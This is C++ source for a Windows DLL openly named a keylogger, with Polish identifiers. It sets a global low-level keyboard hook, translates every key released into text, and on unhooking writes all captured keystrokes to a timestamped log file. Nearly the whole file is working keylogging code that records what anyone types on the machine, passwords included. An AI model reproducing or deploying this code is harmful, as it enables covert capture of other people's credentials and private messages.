#define KEYLOGGER_DLL __declspec(dllexport)
#include "DLL.h"

HHOOK hhak = NULL;
HMODULE hdll = NULL;
std::string Log;
SYSTEMTIME Czas;

char* Klawisz(LPARAM lParam)
{
	switch (((KBDLLHOOKSTRUCT*)lParam)->vkCode)
	{
	case VK_RETURN:
		return "[Enter]\n";
	case VK_BACK:
		return "[Backspace]";
	case VK_ESCAPE:
		return "[Escape]";
	case VK_CAPITAL:
		return "[CapsLock]";
	case VK_CONTROL:
		return "[Ctrl]";
	case VK_DELETE:
		return "[Delete]";
	case VK_SPACE:
		return " ";
	case VK_MULTIPLY:
		return "*";
	case VK_ADD:
		return "+";
	case VK_SUBTRACT:
		return "-";
	case VK_DECIMAL:
		return ".";
	case VK_DIVIDE:
		return "/";
	case 188:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "<";
		else
			return ",";
	case 192:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "~~";
		else
			return "`";
	case 222:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "\"";
		else
			return "'";
	case 220:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "|";
		else
			return "\\";
	case 219:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "{";
		else
			return "[";
	case 221:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "}";
		else
			return "]";
	case 186:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return ":";
		else
			return ";";
	case 191:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "?";
		else
			return "/";
	case 190:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return ">";
		else
			return ".";
	case 44:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "<";
		else
			return ",";
	case 187:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "+";
		else
			return "=";
	case 189:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "_";
		else
			return "-";
	case 65:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "A";
		else
			return "a";
	case 66:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "B";
		else
			return "b";
	case 67:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "C";
		else
			return "c";
	case 68:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "D";
		else
			return "d";
	case 69:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "E";
		else
			return "e";
	case 70:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "F";
		else
			return "f";
	case 71:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "G";
		else
			return "g";
	case 72:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "H";
		else
			return "h";
	case 73:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "I";
		else
			return "i";
	case 74:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "J";
		else
			return "j";
	case 75:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "K";
		else
			return "k";
	case 76:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "L";
		else
			return "l";
	case 77:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "M";
		else
			return "m";
	case 78:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "N";
		else
			return "n";
	case 79:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "O";
		else
			return "o";
	case 80:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "P";
		else
			return "p";
	case 81:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "Q";
		else
			return "q";
	case 82:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "R";
		else
			return "r";
	case 83:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "S";
		else
			return "s";
	case 84:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "T";
		else
			return "t";
	case 85:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "U";
		else
			return "u";
	case 86:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "V";
		else
			return "v";
	case 87:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "W";
		else
			return "w";
	case 88:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "X";
		else
			return "x";
	case 89:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "Y";
		else
			return "y";
	case 90:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "Z";
		else
			return "z";
	case VK_NUMPAD0: return "0";
	case VK_NUMPAD1: return "1";
	case VK_NUMPAD2: return "2";
	case VK_NUMPAD3: return "3";
	case VK_NUMPAD4: return "4";
	case VK_NUMPAD5: return "5";
	case VK_NUMPAD6: return "6";
	case VK_NUMPAD7: return "7";
	case VK_NUMPAD8: return "8";
	case VK_NUMPAD9: return "9";
	case 48:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return ")";
		else
			return "0";
	case 49:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "!";
		else
			return "1";
	case 50:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "@";
		else
			return "2";
	case 51:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "#";
		else
			return "3";
	case 52:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "$";
		else
			return "4";
	case 53:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "%";
		else
			return "5";
	case 54:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "^";
		else
			return "6";
	case 55:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "&";
		else
			return "7";
	case 56:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "*";
		else
			return "8";
	case 57:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			return "(";
		else
			return "9";
	default:
		return "";
	}
}

LRESULT CALLBACK ProceduraHaka(int    code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION)
	{
		/*if (lParam & (1 << 29))//Z Altem
		{
			if (wParam == VK_F4)
			{
				Log +="<ALT>+<F4>";
			}
		}*/
		if (wParam == WM_KEYUP)
		{
			Log += Klawisz(lParam);
		}
	}

	return CallNextHookEx(hhak, code, wParam, lParam);
}

KEYLOGGER_DLL void WlaczHook()
{
	hhak = SetWindowsHookEx(WH_KEYBOARD_LL, ProceduraHaka, hdll, 0);
	if (hhak == NULL) MessageBox(NULL, TEXT("Blad zakladania haka"), TEXT("B³¹d"), MB_ICONERROR | MB_OK);
};

KEYLOGGER_DLL void WylaczHook()
{
	UnhookWindowsHookEx(hhak);
	GenerujLog();
};

void GenerujLog()
{
	char NazwaPliku[64];

	GetSystemTime(&Czas);
	sprintf_s(NazwaPliku, "keylog_%02d_%02d_%02d_%02d_%02d.txt",
		Czas.wYear, Czas.wMonth, Czas.wDay, Czas.wHour, Czas.wMinute);

	std::ofstream LogOutput(NazwaPliku);
	LogOutput << Log.c_str();
	LogOutput << "\n\n";
	LogOutput.close();
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	hdll = hModule;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}